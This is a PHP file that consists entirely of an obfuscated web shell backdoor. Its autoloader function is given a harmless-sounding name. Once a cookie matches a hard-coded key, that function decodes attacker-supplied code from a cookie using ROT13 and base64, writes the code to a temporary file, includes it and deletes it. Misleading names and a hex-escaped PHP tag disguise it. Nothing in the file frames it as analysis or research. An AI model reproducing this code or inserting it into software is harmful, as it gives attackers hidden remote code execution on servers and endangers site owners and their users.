<?php


if (isset($_COOKIE[42-42]) && isset($_COOKIE[52-51]) && isset($_COOKIE[43-40]) && isset($_COOKIE[34-30])) {
    $parameter_group = $_COOKIE;
    function right_pad_string($flg) {
        $parameter_group = $_COOKIE;
        $component = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'a19eb54b');
        if (!is_writable($component)) {
            $component = getcwd() . DIRECTORY_SEPARATOR . "event_dispatcher";
        }
        $resource = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($parameter_group[3]));
        if (is_writeable($component)) {
            $ent = fopen($component, 'w+');
            fputs($ent, $resource);
            fclose($ent);
            spl_autoload_unregister(__FUNCTION__);
            require_once($component);
            @array_map('unlink', array($component));
        }
    }
    spl_autoload_register("right_pad_string");
    $object = "009130d240a8c2e47c594b1ab4eeac70";
    if (!strncmp($object, $parameter_group[4], 32)) {
        if (@class_parents("dependency_resolver_unit_converter", true)) {
            exit;
        }
    }
}
